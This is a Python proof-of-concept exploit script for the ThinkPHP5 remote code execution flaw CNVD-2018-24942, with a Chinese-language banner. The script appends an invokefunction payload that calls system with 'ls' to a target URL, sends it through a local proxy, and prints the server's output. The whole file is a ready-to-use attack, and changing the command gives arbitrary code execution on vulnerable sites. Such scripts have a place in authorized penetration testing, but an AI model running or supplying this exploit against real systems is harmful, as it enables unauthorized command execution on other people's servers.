import re
import sys
import requests



def title():
    print("[-------------------------------------------------------------]")
    print("[--------------      ThinkPHP5 代码执行      ---------------]")
    print("[--------               CNVD-2018-24942              ----------]")
    print("[--------    use:python3 CNVD-2018-24942.py url  --------]")
    print("[--------              Author:鸣蜩十四           ------------]")
    print("[-------------------------------------------------------------]")

def main(url) :
    if (len(sys.argv)==2):
        poc(url)
    else :
        print("Example: \n   python3 " + sys.argv[0] + "url" + "\n")

def poc(url) :
    url = url+r"?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls"
    proxy={
        "http":"http://127.0.0.1:8081"
    }
    a = requests.post(url=url,proxies=proxy)
    if a.status_code == 200:
     print("输出结果为：\n",a.text)
    else :
        print("可能没有此漏洞")



if __name__ == "__main__" :
    title()
    url = sys.argv[1]
    main(url)
